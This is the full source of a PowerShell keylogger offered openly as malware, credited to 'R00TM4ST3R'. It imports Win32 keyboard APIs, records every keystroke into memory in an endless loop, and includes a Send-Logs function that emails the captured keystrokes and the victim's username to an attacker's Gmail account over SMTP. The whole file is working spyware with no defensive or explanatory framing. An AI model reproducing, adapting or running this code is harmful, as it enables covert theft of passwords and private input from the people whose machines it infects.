# powershell keylogger
# created by : R00TM4ST3R

# Gmail credentials
$email = "example@gmail.com"
$password = "password"

# Memory-based keylogger (no file writes until exfil)
$logs = [System.Collections.ArrayList]@()

# Win32 API signatures
$signatures = @'
[DllImport("user32.dll")]
public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")]
public static extern int GetKeyboardState(byte[] pbKeyState);
[DllImport("user32.dll")]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

# Load the API into the session
Add-Type -MemberDefinition $signatures -Name Win32 -Namespace API -PassThru | Out-Null

# Keylogger loop
while ($true) {
    Start-Sleep -Milliseconds 30
    for ($i = 1; $i -le 255; $i++) {
        # Check if a key is currently pressed
        if ([API.Win32]::GetAsyncKeyState($i) -eq -32767) {
            $kbState = New-Object byte[] 256
            [API.Win32]::GetKeyboardState($kbState) | Out-Null
            $sb = New-Object System.Text.StringBuilder 256
            
            # Translate the virtual key code to a unicode character
            if ([API.Win32]::ToUnicode($i, 0, $kbState, $sb, $sb.Capacity, 0)) {
                # Add the logged key to the memory array
                $logs.Add($sb.ToString()) | Out-Null
            }
        }
    }
}

# Exfiltration function (called externally by l.ps1)
function Send-Logs {
    $smtp = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
    $smtp.EnableSSL = $true
    $smtp.Credentials = New-Object Net.NetworkCredential($email, $password)
    
    # Combine all captured keystrokes into a single string
    $body = $logs -join ''
    
    # Send the email
    $smtp.Send($email, $email, "$env:USERNAME Keylogs", $body)
    
    # Clear the logs from memory after sending
    $logs.Clear()
}